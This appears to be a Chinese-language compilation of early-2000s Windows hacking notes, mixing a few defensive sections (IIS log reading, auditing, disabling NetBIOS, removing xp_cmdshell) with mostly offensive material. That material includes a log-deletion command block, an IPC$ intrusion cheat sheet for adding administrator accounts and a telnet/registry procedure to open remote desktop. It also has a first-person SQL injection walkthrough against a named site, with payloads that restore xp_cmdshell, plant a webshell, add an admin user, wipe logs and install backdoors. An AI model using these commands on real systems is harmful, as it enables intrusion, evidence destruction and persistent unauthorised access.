  其实在浏览器上就表现为:http://192.168.0.2/test.txt
  然后继续看后面，需要细看的只有一个地方，那就是数字200，这是一个返回码，代表访问成功
  另外，还有其他代码，例如“403”这样的代码是我们经常看见的。大家可以到c:\winnt\help\iishelp\common下查看，该目录中会有一些
  名如400.htm这样的网页文件，这些文件对应着每个错误代码对应的页面，当有人访问时，产生了错误
  代码为400的情况时，那么IIS将自动将页面转向该目录下的400.htm的页面，有兴趣的朋友可以研究一下这些代码代表的错误信息
  至于ftp日志的查看方法与web服务的日志查看方法类似，就不多说了
3。加强日志
  光靠系统默认的这些日志是不够的，我们还要增加其他日志，比如前面说到的审核，增加了适当的审核之后，在安全日志中会有更多的日志和相关信息
  进入控制面板，打开管理工具--->本地安全策略，选择“本地策略-->审核策略-->审核用户登陆事件”
  双击打开。将成功和失败都选上，确定。这样就对用户的登陆成功和失败都加上了审核，会发现在安全日志中多了一条日志，描述内容包括
  为登陆所用的帐户，帐户名，工作站。。。
  其他一些审核与此类似，不再多说
  这里我要说一下“审核对象访问”，因为这个审核要配合NTFS磁盘来使用，只有在NTFS磁盘上进行设置并且保证该项开启才能使用
  首先，还是在本地安全策略中设置审核对象访问，将成功和失败都选上，然后，找一个NTFS磁盘，右击鼠标，
  属性-->安全-->高级-->审核，点击添加，只要选择你想要添加审核的用户就好了，然后会出现选择审核的内容，视情况设置
  在安全日志中就会出现审核的结果，具体的就不多说了，日志也很容易读懂
  除了使用win2k的审核外，最好的方法就是使用第三方软件来加强我们的日志了，在防御上主要是防火墙类软件，也不多说，以后我们会介绍
好了，话题就说到这儿，哎，手指都快敲断了，但原大家能够有所了解。。。


【关闭你的NetBIOS】
关闭你的NetBIOS 

Richard Gong・yesky
　
　　许多人知道，NetBIOS 是计算机局域网领域流行的一种传输方式，但你是否还知道
，对于互联网用户来讲，NetBIOS 则是安全领域的一大隐患。 
　　一、NetBIOS 的烦恼 
　　NetBIOS 是指网络输入输出系统，在计算机网络发展史中，NetBIOS 算得上是历史
悠久。早在 1985 年，IBM 公司就开始在网络领域使用 NetBIOS，微软推出第一套基于 
Windows 的网络操作系统－－Windows For Workgroups（面向工作组的视窗操作系统）
时，就采用了一种适用于 Windows 的 NetBIOS 版本，即 NetBEUI。微软当年之所以选
择 NetBEUI 作为网络传输的基本协议，是因为它占用系统资源少、传输效率高，尤为适
用于由 20 到 200 台计算机组成的小型局域网。此外，NetBEUI 还有一个最大的优点：
可以方便地实现网络中各单机资源的共享。 
　　后来，网络的发展速度之快，已大大超出人们的想象，进入 20 世纪未，全球的计
算机就已可通过国际互联网络方便连接，随着互联网络的迅猛发展，TCP/IP 协议成为广
泛使用的传输协议。 
　　今天，TCP/IP 协议已是互联网领域的通用协议，几乎所有接入互联网的电脑都使用 
TCP/IP。但同时，NetBEUI 协议也还在局域网领域广泛使用，因此，在你安装 TCP/IP 
协议时，NetBIOS 也被 Windows 作为默认设置载入了你的电脑，而电脑随即也具有了 
NetBIOS 本身的开放性。换句话讲，在不知不觉间，你的上网电脑已被打开了一个危险
的“后门”。 
　　NetBIOS 的开放，意味着你的硬盘可能会在网络中成为共享。对于网上四处游走的 
来讲，他们可以通过 NetBIOS 获知你电脑中的一切！ 

　　二、找寻电脑中开放的“后门” 
　　在想办法关闭电脑的这个“后门”前，我们有必要先认识这个问题：网络中的其它
用户是怎样找到你系统漏洞的？ 
　　你可能认为：在茫茫网海，作为个人上网用户，我的一台电脑是多么的渺小，HACKE
R 们怎会对我感兴趣呢？其实，这种想法是很危险的，网上一些不怀好意的用户（很多
还称不上是 ），说不定哪天就会盯上你。 
　　现在，有许多被称作“扫描机（scanners）”的黑客小程序，这些扫描程序不停地
穿梭于网络之中，专门寻找上网用户的系统漏洞，其中就包括 NetBIOS 及 Windows “
文件及打印共享”功能所打开的系统后门。一旦扫描程序在网上发现了系统存在着漏洞
的计算机，那些恶意攻击者就会设法通过找到的“后门”进入你的计算机，并获取你的
信息。而令人深感不安的是，所有的这些非法入侵行为，你可能竟然毫无知觉。 

　　三、关闭你的“后门” 
　　正如前文所述，系统存在后门的原因是与 TCP/IP 协议捆绑在一起的 NetBIOS,事实
上，对于互联网上的单机用户来讲，NetBIOS 是没有什么用处的，因此，你完全可以将
它从 TCP/IP 中去掉。下面，就现在常见的几种操作系统介绍从TCP/IP 中解除 NetBIOS 
的方法。 

　　如果你使用的是最早版本的 Windows 95，那关闭 NetBIOS 就是一件非常容易的事
：找到系统里名为 Vnbt.386 的文件，随便将它改个名，如改为 Vnbt.out，这就算大功
告成了。 
　　如果你使用的是 Windows 95改进版、Windows 98、Windows 98 SE 或是 Windows 
Me,那就要稍微麻烦一点。首先，打开控制面板，进入“网络”对话窗，在配置表中，查
看列表中是否已有 NetBEUI 组件，如果有，则直接跳过下一段。 
　　如果在列表中没有 NetBEUI 组件，则先点击“添加”按钮，在“要安装的网络组件
类型”列表中，选择“协议”一项，再次点击“添加”，在“网络协议”对话窗中，选
择 Microsoft 的 NetBEUI，然后，插入 Windows 安装盘，点击“确定”即可。 
　　回到“网络”对话窗，在网络组件中选择“拨号适配器”，点击“属性”，在“属
性”对话窗中选择“绑定”按钮，将除TCP/IP之外其它协议的复选框里的小勾清除掉。 

　　最后，再次回到“网络”对话窗，选择 TCP/IP 协议，点击“属性”，这时有可能
会弹出一个警告窗口，不用理它，直接点“OK”就行了，进入 TCP/IP 的“属性”窗口
后，选择“绑定”，将所有网络协议复选框内的小勾去掉，点击“确定”，这时，Windo
ws 会提示你至少应选择一种协议，仍然不用理它，点击“No”，关闭窗口。重新启动你
的计算机，这样，你计算机中的 NetBIOS 后门就已被关闭了。 

　　这样一来，NetBIOS 已从你计算机的 TCP/IP 协议中去除,当然，你最好检查一下操
作是否成功：回到“网络”对话窗，选择 TCP/IP 协议，点击“属性”，在“属性”窗
口中点击 NetBIOS 栏，这时，你会看到“我希望在 TCP/IP 协议中开启 NetBIOS（I 
want to enable NetBIOS over TCP/IP）”一项，该项前面的复选框应该没有打勾。 
　　现在，你就可以放心地在网络中漫游，而不必再担心有人会通过 NetBIOS 入侵你的
电脑。 



【删除日志】
删除日志
del c:\winnt\system32\logfiles\*.*
del c:\winnt\system32\config\*.evt
del c:\winnt\system32\dtclog\*.*
del c:\winnt\system32\*.log
del c:\winnt\system32\*.txt
del c:\winnt\*.txt
del c:\winnt\*.log


【利用ipc$入侵的相关命令】
利用ipc$入侵的相关命令：
我们在入侵的时候难免遇到忘记命令的时候，现在将我所知道的一些命令总结出来提供给各位。通过这些命令可以解决很大一部分新手的问题。
00:net use
    作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。 
　　命令格式： 
    net use [devicename | *] [\\\\computername\\sharename[\\volume]] [password |      *]] [/user:[domainname\\]username] [[/delete] | [/persistent:{yes | no}]] 
    参数介绍： 
    (1)键入不带参数的net use列出网络连接。 
　　(2)devicename指定要连接到的资源名称或要断开的设备名称。 
　　(3)\\\\computername\\sharename服务器及共享资源的名称。 
　　(4)password访问共享资源的密码。 
　　(5)*提示键入密码。 
　　(6)/user指定进行连接的另外一个用户。 
　　(7)domainname指定另一个域。 
　  (8)username指定登录的用户名。 
　　(9)/home将用户连接到其宿主目录。 
　　(10)/delete取消指定网络连接。 
　　(11)/persistent控制永久网络连接的使用。
01: net use \\\\X.X.X.X\\ipc$ \"\" /user:\"\"  建立空连接
02: net use \\\\X.X.X.X\\ipc$ \"密码\" /user:\"用户名\" 建立非空连接
03: net use \\\\X.X.X.X\\ipc$ /del 删除连接
04: net time \\\\X.X.X.X
    作用：使计算机的时钟与另一台计算机或域的时间同步。 
　　命令格式：net time [\\\\computername | /domain[:name]] [/set] 
　　参数介绍： 
　　(1)\\\\computername要检查或同步的服务器名。 
　　(2)/domain[:name]指定要与其时间同步的域。 
　　(3)/set使本计算机时钟与指定计算机或域的时钟同步。
05: net view \\\\X.X.X.X
　　作用：显示域列表、计算机列表或指定计算机的共享资源列表。 
　　命令格式：net view [\\\\computername | /domain[:domainname]] 
　  参数介绍： 
    (1)键入不带参数的net view显示当前域的计算机列表。 
　　(2)\\\\computername 指定要查看其共享资源的计算机。 
　　(3)/domain[:domainname]指定要查看其可用计算机的域。
06: net use X: \\\\X.X.X.X\\Y  将共享名为Y的共享资源映射为本地X盘
07: net use X: /del 删除映射的X盘
08: net share
    作用：创建、删除或显示共享资源。 
　　命令格式：net share share name=drive:path [/users:number | /unlimited]     [/remark:\"text\"] 　　 
    参数介绍：(1)键入不带参数的net share显示本地计算机上所有共享资源的信息。 　  (2)sharename是共享资源的网络名称。 
　　(3)drive:path指定共享目录的绝对路径。 
    (4)/users:number设置可同时访问共享资源的最大用户数。 
　　(5)/unlimited不限制同时访问共享资源的用户数。 
　　(6)/remark:\"text \"添加关于资源的注释，注释文字用引号引住。 
09: net user
    作用：添加或更改用户帐号或显示用户帐号信息。 
    该命令也可以写为 net users 
　　命令格式：net user [username [password | *] [options]] [/domain] 
　　参数介绍：(1)键入不带参数的net user查看计算机上的用户帐号列表。 
　　(2)username添加、删除、更改或查看用户帐号名。 
　　(3)password为用户帐号分配或更改密码。 
　　(4)*提示输入密码。 
　　(5)/domain在计算机主域的主域控制器中执行操作。
10: net start 作用：启动服务，或显示已启动服务的列表。
11: net pause 作用：暂停正在运行的服务。
12: net Continue 作用：重新激活挂起的服务。
13: net stop
    作用：停止 Windows NT 网络服务。 
　　命令格式：net stop service 
　　参数介绍： 
　　(1)alerter(警报) 
　　(2)client service for netware(Netware 客户端服务) 
　　(3)clipbook server(剪贴簿服务器) 
　　(4)computer browser(计算机浏览器) 
　　(5)directory replicator(目录复制器) 
　　(6)ftp publishing service (ftp )(ftp 发行服务) 
　　(7)lpdsvc 
　　(8)net logon(网络登录) 
　　(9)network dde(网络 dde) 
　　(10)network dde dsdm(网络 dde dsdm) 
　　(11)network monitor agent(网络监控代理) 
　　(12)nt lm security support provider(NT LM 安全性支持提供) 
　　(13)ole(对象链接与嵌入) 
　　(14)remote access connection manager(远程访问连接管理器) 
　　(15)remote access isnsap service(远程访问 isnsap 服务) 
　　(16)remote access server(远程访问服务器) 
　　(17)remote procedure call (rpc) locator(远程过程调用定位器) 
　　(18)remote procedure call (rpc) service(远程过程调用服务) 
　　(19)schedule(调度) 
　　(20)server(服务器) 
　　(21)simple tcp/ip services(简单 TCP/IP 服务) 
　　(22)snmp 
　　(23)spooler(后台打印程序) 
　　(24)tcp/ip netbios helper(TCP/IP NETBIOS 辅助工具) 
　　(25)ups 
　　(26)workstation(工作站) 
　　(27)messenger(信使) 
　　(28)dhcp client 
　　(29)eventlog 
14:net Statistics 
　　作用：显示本地工作站或服务器服务的统计记录。 
　　命令格式：net statistics [workstation | server] 
　　参数介绍：(1)键入不带参数的net statistics列出其统计信息可用的运行服务。 
　  (2)workstation显示本地工作站服务的统计信息。 
　　(3)server显示本地服务器服务的统计信息。 　 
　  例：net statistics server | more显示服务器服务的统计信息。
15:net Session ( 等同于net sessions 或net sess)
　作用：列出或断开本地计算机和与之连接的客户端的会话.
　命令格式：net session [\\\\computername] [/delete] 
　参数介绍：(1)键入不带参数的net session显示所有与本地计算机的会话的信息。 
  (2)\\\\computername标识要列出或断开会话的计算机。 
　举例说明： net session \\\\cnse8要显示计算机名为cnse8的客户端会话信息列表。 

15: net user 帐号名 密码 /add 添加帐号和密码
16: net user 帐号名 /active:yes 激活帐号
17: net localgroup administrators 帐号名 /add 将该帐号加入本地admin组
18: Net Send 
　　作用：向网络的其他用户、计算机或通信名发送消息。 
　　命令格式：net send {name | * | /domain[:name] | /users} message 
　　参数介绍：(1)name要接收发送消息的用户名、计算机名或通信名。 
　  (2)*将消息发送到组中所有名称。 
　　(3)/domain[:name]将消息发送到计算机域中的所有名称。 
　　(4)/users将消息发送到与服务器连接的所有用户。 
　　(5)message作为消息发送的文本。 
　　例:(1)net send /users Welcome to cnse8.com 向所有的连接本机的用户显示         \"Welcome to cnse8.com\"
19:net Config 
　 作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。 
　 命令格式：net config [service [options]] 
   参数介绍：
   (1)键入不带参数的net config显示可配置服务的列表。  
   (2)service通过net config命令进行配置的服务(server或workstation)。 
   (3)options服务的特定选项。
20:net Accounts 
　 作用：更新用户帐号数据库、更改密码及所有帐号的登录要求。 
　 命令格式：net accounts [/forcelogoff:{minutes | no}] [/minpwlen:length]       [/maxpwage:{days | unlimited}] [/minpwage:days] [/uniquepw:number]            [/domain] 
　 参数介绍： 
   (1)键入不带参数的net accounts显示当前密码设置、登录时限及域信息。 
   (2)/forcelogoff:{minutes | no}设置当用户帐号或有效登录时间过期时。 
   (3)/minpwlen:length设置用户帐号密码的最少字符数。    
   (4)/maxpwage:{days | unlimited}设置用户帐号密码有效的最大天数。 
   (5)/minpwage:days设置用户必须保持原密码的最小天数。 
   (6)/uniquepw:number要求用户更改密码时，必须在经过number次后才能重复使用与       之相同的密码。
   (7)/domain在当前域的主域控制器上执行该操作。 
   (8)/sync当用于主域控制器时，该命令使域中所有备份域控制器同步。 
　　举例说明：net accounts /minpwlen:7将用户帐号密码的最少字符数设置为7。 
21:copy 路径 \\ 文件名 \\IP\\共享目录名
   例：copy c:\\cnse8.exe \\\\X.X.X.X\\c$ 将c盘下的cnse8.exe文件复制到对方得的c      盘内。
       copy \\\\X.X.X.X\\c$\\cnse8.exe c:\\ 将远程机器上的文件cnse8.exe复制到自己
   机器上。
22:at \\\\IP 时间 程序名 远程添加某个计划.


【利用TELNET开放3389端口】
                       利用TELNET开放3389端口
[size=3]如果对方的端口有开放:
telnet 192.168.0.1
输入用户名/密码
C:\>
\\成功进入!!!!
进入后,再次检查终端组件是否安装:
c:\>query user
这个工具需要安装终端服务. 

这样就进一步确定了组件没有被安装.如果返回:
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME
>w1 console 0 运行中 . 2002-1-12 22:5
\\类似这样的信息,可能组件就已安装.

好!都清楚了,可以开始安装了.
---------------------------------------------------
C:\>dir c:\sysoc.inf /s //检查INF文件的位置
c:\WINNT\inf 的目录

2000-01-10 20:00 3,770 sysoc.inf
1 个文件 3,770 字节
-----------------------------------------------------
C:\> dir c:\sysocmgr.* /s //检查组件安装程序
c:\WINNT\system32 的目录

2000-01-10 20:00 42,768 sysocmgr.exe
1 个文件 42,768 字节
-----------------------------------------------------
c:\>echo [Components] > c:\wawa
c:\>echo TSEnable = on >> c:\wawa
//这是建立无人参与的安装参数
c:\>type c:\wawa
[Components]
TSEnable = on
//检查参数文件
------------------------------------------------------
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\wawa /q
-----------------------------------------------------
这一条就是真正安装组件的命令.
以上这条命令没有加/R参数,主机在安装完后自动重起.
如若加了/R参数主机就不会重起.

如果一切正常的话,几分钟后对方主机将会离线,当它重新回来时,
3389终端服务就已经开启.你就可以连上去了.

这里还有两种方法
第一种开启的办法:
使用DameWare Mini Remote Control远程连接上,
在"终端服务配置"里,重新启用RDP连接,马上就可以使用3389了.
第二种开启的办法:
修改远程注册表.
比如:
主机IP: 192.168.0.1
已有的帐号和密码: wawa/7788
首先与远程主机建立连接
net use \\192.168.0.1\ipc$ "7788" /user:"wawa"
再打开本机注册表
"开始"==>"运行"==>regedit
在"注册表"下拉菜单中选择"连接网络注册表"
在"计算机名"中输入 \\192.168.0.1
这样就进入了远程主机注册表.
现在我们找到这里:
hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp\fEnableWinStation
将fEnableWinStation值由0改为1


-----------============------------============--------==========


SQLEXEC或telnet进入后,检查终端组件是否安装:
c:\>query user
这个工具需要安装终端服务.
这样就进一步确定了组件没有被安装.如果返回:
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME
>w1 console 0 运行中 . 2002-1-12 22:5
\\类似这样的信息,可能组件就已安装.
好!都清楚了,可以开始安装了.
---------------------------------------------------
C:\>dir c:\sysoc.inf /s //检查INF文件的位置
c:\WINNT\inf 的目录

2000-01-10 20:00 3,770 sysoc.inf
1 个文件 3,770 字节
-----------------------------------------------------
C:\> dir c:\sysocmgr.* /s //检查组件安装程序
c:\WINNT\system32 的目录

2000-01-10 20:00 42,768 sysocmgr.exe
1 个文件 42,768 字节
-----------------------------------------------------
c:\>echo [Components] > c:\wawa
c:\>echo TSEnable = on >> c:\wawa
//这是建立无人参与的安装参数
c:\>type c:\wawa
[Components]
TSEnable = on
//检查参数文件
------------------------------------------------------
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\wawa /q
-----------------------------------------------------
这一条就是真正安装组件的命令.
以上这条命令没有加/R参数,主机在安装完后自动重起.
如若加了/R参数主机就不会重起.

如果一切正常的话,几分钟后对方主机将会离线,当它重新回来时,
3389终端服务就已经开启.你就可以连上去了. [/size] 


【利用纯脚本技术拿到系统管理员】
题： 我是怎么利用纯脚本技术，拿到系统管理员权限的

时间：2005-01-10
来源：不详

　　这绝对是一篇非常有观看价值的文章.有我对脚本注入漏洞的深入了解,对入侵的新思维分析.
目前网上到处流行的SQL INUTECTION 漏洞，也就是我们通常所说的SQL注入漏洞.利用这个漏洞大家可以跨表，跨库查询数据库信息.
以及通过论坛来上传文件从而得到主机WEBSHELL。这些都是一些很通常的手法.如果安装了PCANYWHERE，拿下CIF文件，破解后也就拿到了系统管理员账号.
不过,安装PCANYWHERE的机子也并不多.我们就开创一条新的道路.利用这个漏洞，更重要在于去了解和分析服务器的安全配置，找到漏洞.结合系统漏洞.
拿到管理员权限.这才是我们真正要做的.所以，今天我就为大家介绍一下，前段时间我对一大型音乐收费网站进行安全测试的全部.
经过和分析.结果我利用纯脚本技术，拿到了系统管理员权限.

踩点:
踩点，是对一个服务器进行安全测试的首要工作。我们对服务器先进行端口扫描.我拿出了朋友写的一款非常不错的扫描程序,速度相当快.同时开2000个线程半支烟功夫,端口从1-65535就扫完了.
扫描结果,开放端口如下：
21,80,1433,3389
再次扫描得到的结果相同.冲击波过后，网络上的服务器安全了许多.入侵也有一定的难度了.
分析了一下，我把目标集中在21,1433端口. 现在只有看看运气，是否能扫出个弱口令.
真是倒霉，我很久都没有扫到存在弱口今的机子了，今天也一样.什么都没扫出来.
看来，我也有从网站脚本上，寻找出路了.

对网站进行全方面的探索：
开了1433端口，SQLSERVER服务,一般都是ASP+MSSQL结构,来架设网站的,ASP脚本的注入漏洞,比其他脚本漏洞好找. 存在的机率也相对要大得多.我一般对所提交的参数，加入单引号进行判断.没有过滤的参数IE一般都会返回错误信息.

我很快找到了一个没有经过任何过滤的参数.
提交：http://www.cnwill.com/script.asp?id=2'
IE返回：





提交：http://www.cnwill.com/script.asp?id=2 and 1=1
IE返回正常记录.

提交：http://www.cnwill.com/script.asp?id=2 and 1=2
IE没有返回记录.

好了.下面我们就利用这个漏洞拿到服务器和数据库的一些相关信息.
提交：
http://www.cnwill.com/script.asp?id=2 and 1=(select @@VERSION)
这就看到服务器打的补丁情况了!
出错了，呵呵，IE给我们返回了以下错误信息,如图1


( 图1)
服务器打了SP4补丁.据说打了SP4后，也有对80的溢出程序，和对MSSQL SP3的溢出程序.
不过这些我都没有，呵呵，这台服务器从系统方面对于我来讲，还是比较安全的.所以我还是接着从脚本方面着手吧.
再看看他的数据库连接账号的权限吧.
提交：
http://www.cnwill.com/script.asp?id=2 and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))
返回正常,证明当前连接的账号是服务器角色sysadmin权限.
差点没让我把嘴里的一口茶喷到电脑屏幕上.服务器角色居然是sysadmin权限.(如图2)


(图2)
哈哈！看来连接账号多半是SA的了。
提交：
http://www.cnwill.com/script.asp?id=2 and 'sa'=(SELECT System_user)
用来查看连接账号是不是用sa 连接的
IE再一次返回正常.证明了连接账号是SA。权限是至高无尚的了.

到这里，可能很多人，就想到了利用xp_cmdshell。来加系统账号，然后使用终端连接上去.
非常不错的想法!我也是很多人中的一员！我们来试试吧！

利用MSSQL存储过程，得到WEBSHELL。
来，看看xp_cmdshell是否被管理员删除了！
提交:
http://www.cnwill.com/script.asp?id=2 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')
没有返回内容，提示找不到记录了。
看来,xp_cmdshell已经被删除了。呵呵，给他恢复一下.
http://www.cnwill.com/script.asp?id=2;EXEC master.dbo.sp_addextendedproc ‘xp_cmdshell’, 'xplog70.dll'
再试，看xp_cmdshell是不是恢复过来了。

http://www.cnwill.com/script.asp?id=2 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')
同样没有返回内容.这证明，管理员把xplog70.dll这个动态链接库给改名了。要不给删除了.直接恢复是没有没法的了.
对此，我只能说两个字"我忍"！

这么好个漏洞，不好好利用我是不心甘的。先拿他的WEBSHELL再说，拿到WEBSHELL。我有办法对付他的。
我们GO！
看过,N.E.V.E.R和CZY的文章没有？拿WEBSHELL的方法，两位大哥都已经详细的介绍过了。我也把他们的方法写成了程序。方便我使用嘛.
不过很老火的是得不到WEB绝对路径。我们生成的木马保存在什么地方呢？
这可能是很多牛人一直在研究的问题。还好，我对MSSQL还是了解点点。有办法得到他的WEB绝对路径.跟我来吧.

下面我们要利用两个MSSQL存储过程.现在给大家介绍一下:
xp_regread 扩展存储过程和sp_makewebtask WEB 助手存储过程.

xp_regread是用来读出注册表信息的.我们用来得到WEB绝对路径就是用他.
sp_makewebtask是用来得到WEBSHELL的,其主要功能就是导出数据库中的表的记录为文件。
我这里就不用N.E.V.E.R大哥的方法了。他的方法是导出库文件，文件都比较大,所以采用了CZY大哥的方法。

1.怎么拿到WEB绝对路径？
呵呵，这个问题，花了我很久时间去研究.大家都知道MS的东西，都放在注册表中的。
在注册表中我们得到WEB位置就是：
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots
利用扩展存储过程：xp_regread我们可以取得他的值.

EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE',
'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/'
这样，就取出来了，问题又来咯，取是取出来了，我们怎么在IE中返回他的值呢？
我们先创建一个临时表，表中加一字段,类型为：char 255 呵呵这个用来保存WEB绝对路径的值.
表建好后，我们就用读取注册表的方法，把返回的值保存在一变量中。
然后向新建的表中加入变量的值。这样，路径就写入了表中。
来：
DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE',
'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output insert into 临时表 (临时字段名) values(@result);--

然后，我们再提交: 1=(select count(*) from 临时表 where 临时字段名>1)
这样IE报错,就把刚才插进去的WEB路径的值报出来了。
我也试过直接用变量来报错,让IE返回变量的值，结果是失败的，所以就想到了建临时表加数据进去的方法！
最后我们再删除刚建的临时表。工作就此告一段落。

2.怎么拿到WEBSHELL。
CZY大哥的文章已经写得很详细了。所以，我这里就只简单的提一下吧!
先创建一个表，建一字段，然后向这个字段中加入木马的内容。
然后，把内容通过xp_makewebtask存储过程导出成ASP脚本保存在WEB绝对路径中.
再次删除建的昨时表，一切就OVER了。
如：
EXECUTE sp_makewebtask @outputfile = 'C:\WEB\yfdmm.asp',
@query = 'SELECT 你的字段 FROM 你建的临时表'
呵呵，结果就出来了。当然我都写成了程序，所以就不用那么麻烦，自己手工一行一行的加数据进去了。

方法和思路都写了。现在我们就来行动吧.
还是先看看，他这两个扩展存储过程是不是已经被删除了。如果被删了，我也不想活人了。真到兴头，冷水就来了。
提交：
http://www.cnwill.com/script.asp?id=2 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread')
提交：
http://www.cnwill.com/script.asp?id=2 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask')
啦啦啦！今天是什么日子，我比过年还开心啦。全部返回正常。两个要用到的存储过程都没有删除。
（不过一般管理员也不会删除这两个的.了解太少了，也就不会注意他们嘛！）

好，来拿WEB绝对路径.
建表:
http://www.cnwill.com/script.asp?id=2;create table [dbo].[cyfd] ([gyfd][char](255));

向表中加数据:
http://www.cnwill.com/script.asp?id=2;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE',
'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output
insert into cyfd (gyfd) values(@result);--
爆出WEBSHELL的绝对路径：
http://www.cnwill.com/script.asp?id=2 and 1=(select count(*) from cyfd
where gyfd > 1)


如图3



哇,WEB绝对路径出来了： d:\Inetpub\wwwroot.
后面的,,211我们不管。
再把刚才建的表给删掉.
http://www.cnwill.com/script.asp?id=2;drop table cyfd;--

OK，有了路径下面的就好办多。
打开我写的获取WEBSHELL的程序。
输入漏洞URL：http://www.yfd.com/yfd.com?id=2

输入保存木马的绝对路径：d:\Inetpub\wwwroot.
木马我早就配置好了，代码简减了又简减只有30行代码，这样才少向服务器提交数据。
加快速度嘛!木马的主要功能，就是输入内容，把输入的内容保存为一个文件。呵呵，通过这样的木马，我们就可以实现上传一些功能强大的脚本木马了,如海洋木马.
一分钟不到。程序都已经运行完毕。输入相应的路径。娃哈哈，WEBSHELL就来了。以最快的速度生成了一个海洋木马。
如图4,5:

(图4)

(图5)
我生活在幸福之中。开心吧！下面我们还得接着干呢!

恢复xp_cmdshell，我们要拿到系统管理员权限

下面的工作就是很简单，很轻松了。10分钟不到，就给你一个管理员账号.
都说了xp_cmdshell已经被删除了。并且无法恢复，这多半是管理员把xplog70.dll文件给删除，要不改名了。
没事，我们上传一个xplog70.dll就搞定一切了。
通过WEBSHELL。我很快就把xplog70.dll文件给他上传到e:\inetpub\wwwroot目录下了。
来吧，我们来给他恢复。
提交：
http://www.cnwill.com/script.asp?id=2;EXEC master.dbo.sp_addextendedproc ‘xp_cmdshell’, 'e:\inetpub\wwwroot\xplog70.dll'
恢复，支持绝对路径的恢复哦。：）如图


OK。我们用IE来查看一下是不是已经恢复了。
提交：
http://www.cnwill.com/script.asp?id=2 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')
嘿嘿。返回正常。已经恢复了.。
下面的还用我说吗？呵呵！

加账号:
http://www.cnwill.com/script.asp?id=2;exec master.dbo.xp_cmdshell 'net user chouyfd chouyfd1314yf /add'
提升自己为超级管理员
http://www.cnwill.com/script.asp?id=2;exec master.dbo.xp_cmdshell 'net localgroup administrators chouyfd /add'

完毕。打开你的终端连接程序，连接吧!
哈哈，终于给我连上了。到此我就成功的拿到了这台主机的系统管理员账号. 如图6:

(图6)


　下面的工作就是清除日志和留下超级后门，然后闪人!

事后处理工作
终端连接上后，以最快的速度，清除IIS日志，和MSSQL日志.
同时，把xp_cmdshell也给他删除掉，不要让他发现了,也就不好办了。再把我上传的那个xplog70.dll移动到SYSTEM32目录下
改个我都不知道什么意思的名字叫：msxlog32.dll（打死他，他也查不出来，哈哈！）
嗯，再拿来，朋友提供的超级内核后门程序安装起，再把存在漏洞的脚本文件给打上补丁。同时在他的那个脚本程序中，我修改了代码。
　提交特定的参数(POST提交方式)，显示我的WEB后门程序! 这样两个后门，很保险！怕什么呢？开开心心过年吧！

结束语!
本文章中的URL我全部经过处理，所以请大家原谅：）文章可能还有很多地方大家有不明白的。
抱歉，篇幅有限，直接和我交流吧！：dy-e@163.net

这次完全通过脚本技术拿到系统管理员账号.也是我很久以来，对MSSQL深入学习的结果.
本文章，主要在于入侵的思路.方法是多种多样的。希望对大家有所帮助。可能我对MSSQL的研究到此就结束了。期待我更精彩的吧！我能做到！相信我！

【加用户和转换CMD用户】
net user qiwuqi 123 /ad & net localgroup administrators qiwuqi /ad

runas /user:qiwuqi cmd 

【去除SA的xp_cmdshell权限】
                    去除SA的xp_cmdshell权限

如果你不需要扩展存储过程xp_cmdshell请把它去掉。使用这个SQL语句： 

use master 

sp_dropextendedproc 'xp_cmdshell' 

xp_cmdshell是进入操作系统的最佳捷径，是数据库留给操作系统的一个大后门。如果你需要这个存储过程，请用这个语句也可以恢复过来。 

sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 



如果服务器存在SQL的SA空口令漏洞，探测结果会显示，参考[图3]。 

解决方法：运行SQLSERVER管理工具，给SA帐号加上强壮密码，还要在SQL命令行执行： 
“if exists (select * from dbo.sysobjects where id = object_id(N[dbo].[xp_cmdshell] 
) and OBJECTPROPERTY(id, NIsExtendedProc) = 1) exec sp_dropextendedproc N[dbo] 
.[xp_cmdshell] ” 
GO 
或： 
“use master 
sp_dropextendedproc xp_cmdshell” 
这样就算攻击者获得SA帐号密码远程连接后，也不能调用CMDSHELL了。 

另外一个也是很常用的数据库MYSQL，默认安装后也存在ROOT空口令漏洞，如果你不补上的话， 
INTERNET上任意远程主机都可以连接你服务器上的MYSQL数据库，任意编辑，修改，删除数据库 
甚至可以通过它来提升权限，完全控制你的服务器。所以必须重视。 
解决方法：在mysql>状态下输入： 
grant select,insert,update,delete on *.* to root@"%" identified by "pass"； 
语句即可为ROOT设置口令。这样攻击者就不能远程连接本机数据库了。参考[图4] 

如果你的服务器安装了PERL解析，很可能会存在CGI漏洞。 
解决方法：这就需要打齐微软的最新补丁，在IIS里把CGI论坛的图片目录属性设置成（无） 
即不运行任何教程和程序，这样可以最大限度的减少被攻击的风险。 



伺服器: 息 170，蛹 15，B 1，行 1
行 1: 'dbo' 附近的Z法不正_。
伺服器: 息 170，蛹 15，B 1，行 2
行 2: 'dbo' 附近的Z法不正_。



【国内http代理列表】
211.99.99.77:3128 山东省济南市百灵宽带 218.30.119.83:3128 北京市电信机房
218.58.50.68:80山东省青岛市 210.22.7.194:80 广东省深圳市网通 
61.179.12.211:80 山东省济南市网通光纤 218.200.142.138:80 湖北省襄樊市
